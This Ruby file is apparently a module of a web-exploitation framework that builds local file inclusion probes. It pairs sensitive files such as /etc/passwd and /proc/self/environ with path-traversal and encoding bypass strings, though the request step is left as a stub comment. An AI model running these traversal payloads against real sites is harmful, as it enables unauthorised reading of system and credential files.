require_relative '../../core/base_module'

module Websploit
  class LfiExploit < Websploit::BaseModule
    path 'exploit/lfi'

    register_option 'TARGET', default: '', required: true, description: 'Target URL'
    register_option 'PARAM', default: 'file', required: false, description: 'Parameter to test'
    register_option 'METHOD', default: 'GET', required: false, description: 'HTTP Method (GET/POST)'

    def run
      target = options["TARGET"][:current]
      param = options["PARAM"][:current]
      method = options["METHOD"][:current]

      puts "[*] Testing LFI on #{target}"
      puts "[*] Parameter: #{param}"
      puts "[*] Method: #{method}"

      # Lista de arquivos comuns para testar
      files = [
        '/etc/passwd',
        '/etc/hosts',
        '/etc/apache2/apache2.conf',
        '/proc/self/environ',
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        '/var/www/html/index.php',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'C:\\Windows\\win.ini'
      ]

      # Técnicas de bypass
      bypasses = [
        '../',
        '..\\',
        '....//',
        '....\\\\',
        '%2e%2e%2f',
        '..%252f',
        '..%c0%af',
        '..%c1%9c'
      ]

      files.each do |file|
        bypasses.each do |bypass|
          path = bypass * 5 + file
          puts "[*] Testing: #{path}"
          # Implementação do teste LFI aqui
        end
      end
    end
  end
end 